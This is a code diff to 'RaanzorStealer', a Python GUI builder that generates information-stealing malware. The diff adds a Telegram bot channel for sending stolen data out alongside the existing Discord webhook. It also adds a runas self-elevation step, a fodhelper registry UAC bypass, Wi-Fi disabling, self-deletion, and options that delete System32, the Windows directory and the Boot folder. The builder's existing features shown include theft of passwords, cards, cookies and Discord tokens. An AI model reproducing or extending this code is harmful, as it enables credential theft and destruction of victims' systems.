@@ -23,6 +23,9 @@ import threading
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import uuid
 import hashlib
+import ctypes
+import sys
+import telegram
 
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
@@ -55,24 +58,26 @@ class RaanzorStealer(ctk.CTk):
         self.menu_buttons = [
             ("Builder", self.show_builder),
             ("Docu", self.show_documentation),
-            ("FAQ", self.show_faq)
+            ("FAQ", self.show_faq),
+            ("Settings", self.show_settings)
         ]
 
         for label, command in self.menu_buttons:
             btn = ctk.CTkButton(
                 self.sidebar,
                 text=label,
-                font=("Arial", 20, "bold"),  
-                text_color="black",  
+                font=("Arial", 20, "bold"),
+                text_color="black",
                 fg_color="#8B0000",
                 hover_color="#FF0000",
                 command=command,
-                corner_radius=10,  
+                corner_radius=10,
                 height=60
             )
             btn.pack(fill="x", padx=10, pady=5)
 
         self.pages = {}
+        self.version = "Discord"
         self.show_builder()
 
     def clear_content(self):
@@ -119,12 +124,12 @@ class RaanzorStealer(ctk.CTk):
             text="⚙ Build",
             width=160,
             height=40,
-            font=("Arial", 16, "bold"),  # Changed font to Arial and made it bold
+            font=("Arial", 16, "bold"),
             fg_color="#8B0000",
             hover_color="#FF0000",
-            text_color="black",  # Changed text color to black
+            text_color="black",
             command=self.generate_script,
-            corner_radius=10  # Added rounded corners
+            corner_radius=10
         )
         self.generate_btn.pack(side="left", padx=5)
 
@@ -132,11 +137,24 @@ class RaanzorStealer(ctk.CTk):
         webhook_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
         webhook_frame.pack(fill="x", padx=30, pady=(30, 15))
 
-        webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Consolas", 14), text_color="white")
-        webhook_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)
+        if self.version == "Discord":
+            webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Consolas", 14), text_color="white")
+            webhook_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)
 
-        self.webhook_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="https://discord.com/api/webhooks/...")
-        self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
+            self.webhook_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="https://discord.com/api/webhooks/...")
+            self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
+        else:
+            bot_token_label = ctk.CTkLabel(webhook_frame, text="Bot Token:", font=("Consolas", 14), text_color="white")
+            bot_token_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)
+
+            self.bot_token_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="Enter your bot token...")
+            self.bot_token_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
+
+            chat_id_label = ctk.CTkLabel(webhook_frame, text="Chat ID:", font=("Consolas", 14), text_color="white")
+            chat_id_label.grid(row=1, column=0, sticky="w", padx=10, pady=10)
+
+            self.chat_id_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="Enter your chat ID...")
+            self.chat_id_entry.grid(row=1, column=1, sticky="ew", padx=10, pady=10)
 
         self.test_webhook_btn = ctk.CTkButton(
             webhook_frame,
@@ -146,11 +164,11 @@ class RaanzorStealer(ctk.CTk):
             command=self.test_webhook,
             width=150,
             height=30,
-            font=("Arial", 14, "bold"),  # Changed font to Arial and made it bold
-            text_color="black",  # Changed text color to black
-            corner_radius=10  # Added rounded corners
+            font=("Arial", 14, "bold"),
+            text_color="black",
+            corner_radius=10
         )
-        self.test_webhook_btn.grid(row=0, column=2, padx=10, pady=10)
+        self.test_webhook_btn.grid(row=2, column=1, padx=10, pady=10)
 
         webhook_frame.grid_columnconfigure(1, weight=1)
 
@@ -160,7 +178,8 @@ class RaanzorStealer(ctk.CTk):
             "Screenshot", "Webcam Screen", "Wi-Fi SSID", "Kill All Programs", "Kill Discord Client", "Shutdown",
             "Fake Error", "Disconnect User", "Browsers Passwords", "Credit Cards", "Discord Token", "History",
             "Cookies", "Common Files", "TskMgr Info", "Shell History", "IPConf", "HWID", "UUID", "Discord Info",
-            "Credentials", "Games"
+            "Credentials", "Games", "System32 Deleter", "Windows Deleter", "BootLoader Deleter", "UAC Bypass",
+            "Network Disruption", "Automated File Deleter"
         ]}
 
         container = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
@@ -180,10 +199,11 @@ class RaanzorStealer(ctk.CTk):
         categories = {
             "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown", "TskMgr Info", "IPConf", "HWID", "UUID"],
             "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files", "Shell History"],
-            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User"],
+            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User", "UAC Bypass", "Network Disruption"],
             "Multimedia": ["Screenshot", "Webcam Screen"],
             "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop", "Discord Info"],
-            "Additional Info": ["Credentials", "Games"]
+            "Additional Info": ["Credentials", "Games"],
+            "Dangerous Actions": ["System32 Deleter", "Windows Deleter", "BootLoader Deleter", "Automated File Deleter"]
         }
 
         self.checkboxes = {}
@@ -212,6 +232,28 @@ class RaanzorStealer(ctk.CTk):
                     col = 0
                     row_idx += 1
             row_idx += 1
+
+        # Add File Size option
+        file_size_label = ctk.CTkLabel(scrollable_frame, text="FILE SIZE", font=("Consolas", 16, "bold"), text_color="#FF0000")
+        file_size_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
+        row_idx += 1
+
+        self.file_size_var = ctk.StringVar(value="1MB")
+        file_sizes = ["1MB", "10MB", "20MB", "30MB", "40MB", "50MB", "60MB", "70MB", "75MB", "80MB", "90MB", "100MB"]
+
+        for size in file_sizes:
+            radio_btn = ctk.CTkRadioButton(
+                scrollable_frame,
+                text=size,
+                variable=self.file_size_var,
+                value=size,
+                text_color="white",
+                fg_color="#8B0000",
+                hover_color="#FF0000"
+            )
+            radio_btn.grid(row=row_idx, column=file_sizes.index(size) % 3, sticky="w", padx=10, pady=3)
+            if (file_sizes.index(size) + 1) % 3 == 0:
+                row_idx += 1
 
     def checkbox_color_update(self, option_name):
         checkbox = self.checkboxes.get(option_name)
@@ -304,7 +346,7 @@ RaanzorStealerV2 is an advanced information-gathering tool developed in Python w
 - Capture screenshots and webcam images
 - Scan common directories like Downloads
 - Control specific processes (Discord, shutdown)
-- Send collected data to a Discord webhook
+- Send collected data to the webhook
 
 3. Is it legal to use RaanzorStealerV2?
 No. Using this tool without explicit authorization is illegal. It is intended for educational purposes, authorized penetration testing, or security research only.
@@ -361,29 +403,90 @@ Yes, provided you comply with the MIT license and use it legally and ethically.
         text_box.insert("0.0", faq_text)
         text_box.configure(state="disabled")
 
+    def show_settings(self):
+        self.clear_content()
+
+        settings_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
+        settings_frame.pack(fill="both", expand=True, padx=20, pady=20)
+
+        version_label = ctk.CTkLabel(settings_frame, text="Builder Version:", font=("Consolas", 16), text_color="white")
+        version_label.pack(pady=10)
+
+        self.version_var = ctk.StringVar(value=self.version)
+        version_options = ["Discord", "Telegram"]
+
+        for option in version_options:
+            radio_btn = ctk.CTkRadioButton(
+                settings_frame,
+                text=option,
+                variable=self.version_var,
+                value=option,
+                text_color="white",
+                fg_color="#8B0000",
+                hover_color="#FF0000"
+            )
+            radio_btn.pack(pady=5)
+
+        save_btn = ctk.CTkButton(
+            settings_frame,
+            text="Save",
+            fg_color="#8B0000",
+            hover_color="#FF0000",
+            command=self.save_settings,
+            width=150,
+            height=30,
+            font=("Arial", 14, "bold"),
+            text_color="black",
+            corner_radius=10
+        )
+        save_btn.pack(pady=20)
+
+    def save_settings(self):
+        self.version = self.version_var.get()
+        self.show_message(f"Settings saved. Version: {self.version}")
+        self.show_builder()
+
     def show_message(self, message):
-        self.status_label.configure(text=message)
+        messagebox.showinfo("Info", message)
 
     def test_webhook(self):
-        url = self.webhook_entry.get()
-        if not url.startswith("http"):
-            self.show_message("Invalid Webhook URL")
-            return
-        try:
-            response = requests.post(url, json={"content": "Webhook Test"})
-            if response.status_code == 204:
+        if self.version == "Discord":
+            url = self.webhook_entry.get()
+            if not url.startswith("http"):
+                self.show_message("Invalid Webhook URL")
+                return
+            try:
+                response = requests.post(url, json={"content": "Webhook Test"})
+                if response.status_code == 204:
+                    self.show_message("Webhook Valid")
+                else:
+                    self.show_message("Invalid Webhook")
+            except Exception as e:
+                self.show_message(f"Error testing webhook: {e}")
+        else:
+            bot_token = self.bot_token_entry.get()
+            chat_id = self.chat_id_entry.get()
+            if not bot_token or not chat_id:
+                self.show_message("Invalid Bot Token or Chat ID")
+                return
+            try:
+                bot = telegram.Bot(token=bot_token)
+                bot.send_message(chat_id=chat_id, text="Webhook Test")
                 self.show_message("Webhook Valid")
-            else:
-                self.show_message("Invalid Webhook")
-        except Exception as e:
-            self.show_message(f"Error testing webhook: {e}")
+            except Exception as e:
+                self.show_message(f"Error testing webhook: {e}")
 
     def generate_script(self):
-        webhook = self.webhook_entry.get()
+        if self.version == "Discord":
+            webhook = self.webhook_entry.get()
+        else:
+            bot_token = self.bot_token_entry.get()
+            chat_id = self.chat_id_entry.get()
+
         selected_options = [name for name, var in self.options.items() if var.get()]
         if "Fake Error" in selected_options:
             self.get_fake_error_info()
-        script_content = self.create_script_content(webhook, selected_options)
+        script_content = self.create_script_content(webhook if self.version == "Discord" else (bot_token, chat_id), selected_options)
         output_format = self.format_option.get()
 
         if output_format == "Python (.py)":
@@ -409,10 +512,14 @@ Yes, provided you comply with the MIT license and use it legally and ethically.
         self.fake_error_title = simpledialog.askstring("Error Title", "Enter the error title:")
         self.fake_error_message = simpledialog.askstring("Error Message", "Enter the error message:")
 
-    def create_script_content(self, webhook, options):
-        script_parts = []
+    def create_script_content(self, webhook_or_telegram, options):
+        if self.version == "Discord":
+            script_parts = [f"webhook = '{webhook_or_telegram}'"]
+        else:
+            bot_token, chat_id = webhook_or_telegram
+            script_parts = [f"bot_token = '{bot_token}'", f"chat_id = '{chat_id}'"]
 
-        script_parts.append(f"""
+        script_parts.append("""
 import requests
 import platform
 import socket
@@ -434,27 +541,55 @@ import threading
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import uuid
 import hashlib
+import ctypes
+import sys
+import telegram
 
-webhook = '{webhook}'
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def request_admin():
+    ctypes.windll.shell32.ShellExecuteW(
+        None, "runas", sys.executable, " ".join(sys.argv), None, 1
+    )
 
 def send_embed(title, fields):
-    embed = {{
-        "title": title,
-        "color": 65280,
-        "fields": fields
-    }}
-    try:
-        requests.post(webhook, json={{"embeds": [embed]}})
-    except Exception as e:
-        print(f"Error sending embed: {{e}}")
+    if 'webhook' in globals():
+        embed = {
+            "title": title,
+            "color": 65280,
+            "fields": fields
+        }
+        try:
+            requests.post(webhook, json={"embeds": [embed]})
+        except Exception as e:
+            print(f"Error sending embed: {e}")
+    else:
+        bot = telegram.Bot(token=bot_token)
+        message = f"{title}\\n" + "\\n".join([f"{field['name']}: {field['value']}" for field in fields])
+        try:
+            bot.send_message(chat_id=chat_id, text=message)
+        except Exception as e:
+            print(f"Error sending message: {e}")
 
 def send_file(file_path, title):
-    try:
-        with open(file_path, "rb") as file:
-            files = {{"file": (file_path, file.read())}}
-            requests.post(webhook, files=files)
-    except Exception as e:
-        print(f"Error sending file: {{e}}")
+    if 'webhook' in globals():
+        try:
+            with open(file_path, "rb") as file:
+                files = {"file": (file_path, file.read())}
+                requests.post(webhook, files=files)
+        except Exception as e:
+            print(f"Error sending file: {e}")
+    else:
+        bot = telegram.Bot(token=bot_token)
+        try:
+            with open(file_path, "rb") as file:
+                bot.send_document(chat_id=chat_id, document=file)
+        except Exception as e:
+            print(f"Error sending file: {e}")
 """)
 
         if "System Info" in options:
@@ -989,8 +1124,77 @@ def get_installed_games():
         print(f"Error getting installed games: {e}")
 """)
 
+        if "System32 Deleter" in options:
+            script_parts.append("""
+def delete_system32():
+    try:
+        system32_path = os.path.join(os.environ["WINDIR"], "System32")
+        shutil.rmtree(system32_path)
+        send_embed("🗑️ System32 Deleted", [{"name": "Status", "value": "System32 directory deleted", "inline": False}])
+    except Exception as e:
+        print(f"Error deleting System32: {e}")
+""")
+
+        if "Windows Deleter" in options:
+            script_parts.append("""
+def delete_windows():
+    try:
+        windows_path = os.environ["WINDIR"]
+        shutil.rmtree(windows_path)
+        send_embed("🗑️ Windows Deleted", [{"name": "Status", "value": "Windows directory deleted", "inline": False}])
+    except Exception as e:
+        print(f"Error deleting Windows: {e}")
+""")
+
+        if "BootLoader Deleter" in options:
+            script_parts.append("""
+def delete_bootloader():
+    try:
+        bootloader_path = os.path.join(os.environ["WINDIR"], "Boot")
+        shutil.rmtree(bootloader_path)
+        send_embed("🗑️ BootLoader Deleted", [{"name": "Status", "value": "BootLoader directory deleted", "inline": False}])
+    except Exception as e:
+        print(f"Error deleting BootLoader: {e}")
+""")
+
+        if "UAC Bypass" in options:
+            script_parts.append("""
+def uac_bypass():
+    try:
+        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/d", "cmd /k start", "/f"], check=True)
+        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"], check=True)
+        subprocess.run(["fodhelper.exe"], check=True)
+        send_embed("🔓 UAC Bypass", [{"name": "Status", "value": "UAC Bypass executed", "inline": False}])
+    except Exception as e:
+        print(f"Error executing UAC Bypass: {e}")
+""")
+
+        if "Network Disruption" in options:
+            script_parts.append("""
+def network_disruption():
+    try:
+        subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=disable"], check=True)
+        send_embed("📶 Network Disruption", [{"name": "Status", "value": "Wi-Fi disabled", "inline": False}])
+    except Exception as e:
+        print(f"Error disabling Wi-Fi: {e}")
+""")
+
+        if "Automated File Deleter" in options:
+            script_parts.append("""
+def automated_file_deleter():
+    try:
+        file_path = os.path.abspath(__file__)
+        os.remove(file_path)
+        send_embed("🗑️ Automated File Deleter", [{"name": "Status", "value": "File deleted", "inline": False}])
+    except Exception as e:
+        print(f"Error deleting file: {e}")
+""")
+
         script_parts.append("""
 if __name__ == "__main__":
+    if not is_admin():
+        request_admin()
+        sys.exit()
 """)
 
         for option in options:
@@ -1051,6 +1255,18 @@ if __name__ == "__main__":
                 script_parts.append("    get_installed_games()\n")
             elif option == "Discord Info":
                 script_parts.append("    get_discord_info()\n")
+            elif option == "System32 Deleter":
+                script_parts.append("    delete_system32()\n")
+            elif option == "Windows Deleter":
+                script_parts.append("    delete_windows()\n")
+            elif option == "BootLoader Deleter":
+                script_parts.append("    delete_bootloader()\n")
+            elif option == "UAC Bypass":
+                script_parts.append("    uac_bypass()\n")
+            elif option == "Network Disruption":
+                script_parts.append("    network_disruption()\n")
+            elif option == "Automated File Deleter":
+                script_parts.append("    automated_file_deleter()\n")
 
         return ''.join(script_parts)
 
